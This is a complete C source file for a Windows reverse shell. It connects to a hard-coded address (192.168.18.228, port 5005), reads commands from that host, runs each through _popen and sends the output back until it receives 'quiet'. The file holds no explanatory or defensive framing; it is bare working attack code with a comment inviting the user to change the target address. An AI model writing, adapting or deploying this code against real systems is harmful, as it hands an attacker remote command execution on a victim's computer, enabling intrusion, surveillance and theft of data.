#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define MAX_BUFFER_SIZE 1024

void executeCommand(SOCKET sock, const char* cmd) {
    char response[MAX_BUFFER_SIZE];
    memset(response, 0, sizeof(response));
    
    FILE* fp = _popen(cmd, "r");
    if (fp != NULL) {
        while (fgets(response, sizeof(response), fp) != NULL) {
            send(sock, response, strlen(response), 0);
            memset(response, 0, sizeof(response));
        }
        _pclose(fp);
    }
}

void handleCommands(SOCKET sock) {
    char command[MAX_BUFFER_SIZE];
    
    while (1) {
        memset(command, 0, sizeof(command));
        
        int bytesReceived = recv(sock, command, sizeof(command), 0);
        if (bytesReceived <= 0) {
            break;
        }
        
        if (strcmp("quiet", command) == 0) {
            break;
        }
	else if(strcmp("dir", command) == 0){
		executeCommand(sock, command);
	} 
	else {
            executeCommand(sock, command);
        }
    }
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(5005);  // Change the port if needed
    serverAddr.sin_addr.s_addr = inet_addr("192.168.18.228"); // Change this address

    if (connect(sock, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    handleCommands(sock);

    closesocket(sock);
    WSACleanup();

    return 0;
}
